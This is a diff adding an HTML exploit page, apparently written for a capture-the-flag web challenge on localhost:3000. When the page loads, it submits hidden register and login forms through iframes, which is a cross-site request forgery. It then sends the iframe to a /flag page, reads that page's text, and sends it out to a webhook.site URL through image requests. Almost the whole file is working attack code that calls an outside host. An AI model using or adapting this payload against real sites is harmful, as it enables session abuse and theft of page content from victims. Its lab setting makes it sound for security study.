@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<body>
+<iframe name="f1" id="f1"></iframe>
+<iframe name="f2" id="f2"></iframe>
+
+<form id="regForm" method="POST" action="http://localhost:3000/register" target="f1">
+  <input name="username" value="finaltest">
+  <input name="password" value="finaltest">
+</form>
+
+<form id="loginForm" method="POST" action="http://localhost:3000/login" target="f2">
+  <input name="username" value="finaltest">
+  <input name="password" value="finaltest">
+</form>
+
+<script>
+document.getElementById('regForm').submit();
+
+setTimeout(function(){
+  document.getElementById('loginForm').submit();
+}, 150);
+
+// f2 iframe 안에서 직접 /flag로 이동 (세션 쿠키 유지)
+setTimeout(function(){
+  try {
+    document.getElementById('f2').contentWindow.location.href = 'http://localhost:3000/flag';
+  } catch(e) {
+    new Image().src = 'https://webhook.site/showontest?nav_err=' + encodeURIComponent(e.message);
+  }
+}, 400);
+
+setTimeout(function(){
+  try {
+    var c = document.getElementById('f2').contentDocument.body.innerText;
+    new Image().src = 'https://webhook.site/showontest?flag=' + encodeURIComponent(c);
+  } catch(e) {
+    new Image().src = 'https://webhook.site/showontest?err=' + encodeURIComponent(e.message);
+  }
+}, 700);
+</script>
+</body>
+</html>
